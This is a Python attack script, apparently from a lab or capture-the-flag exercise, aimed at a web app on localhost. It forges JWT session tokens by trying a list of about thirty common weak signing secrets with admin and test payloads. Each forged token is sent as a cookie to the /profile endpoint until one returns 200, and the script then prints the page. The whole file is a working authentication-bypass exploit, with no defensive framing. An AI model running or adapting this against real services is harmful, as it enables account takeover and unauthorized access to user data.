import base64, hmac, hashlib, json, urllib.request, urllib.error

base='http://localhost:5003'

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def make_jwt(payload, secret):
    header = {"alg":"HS256","typ":"JWT"}
    h = b64url(json.dumps(header, separators=(',',':')).encode())
    p = b64url(json.dumps(payload, separators=(',',':')).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    s = b64url(sig)
    return f"{h}.{p}.{s}"

secrets = [
    'secret','SECRET_KEY','dev','development','password','admin','supersecret','jwtsecret','mysecret','changeme','flask','flask-secret-key','topsecret','key','123456','qwerty','letmein','abc123','s3cr3t','test','testing','local','insecure','default','default-secret','verysecret','supersecretkey','myjwtsecret','private','public'
]

payload_candidates = [
    {"username":"admin"},
    {"user":"admin"},
    {"name":"admin"},
    {"username":"test"},
    {"user":"test"},
    {"role":"admin","username":"admin"},
    {"is_admin":True,"username":"admin"}
]

for sec in secrets:
    for pl in payload_candidates:
        token = make_jwt(pl, sec)
        req = urllib.request.Request(base+'/profile', headers={'Cookie': f'token={token}'})
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                code=r.getcode()
                body=r.read(200).decode('utf-8','ignore')
                print('TRY', sec, pl, '->', code)
                # If 200, likely success; print snippet and stop
                if code==200:
                    print('SUCCESS', sec, pl)
                    print(body)
                    raise SystemExit
        except urllib.error.HTTPError as e:
            # read body
            body=e.read().decode('utf-8','ignore')
            # print only interesting codes (not 302 or 401)
            if e.code not in (302,401):
                print('TRY', sec, pl, '->', e.code, body[:120])
        except Exception as ex:
            print('ERR', sec, pl, ex)
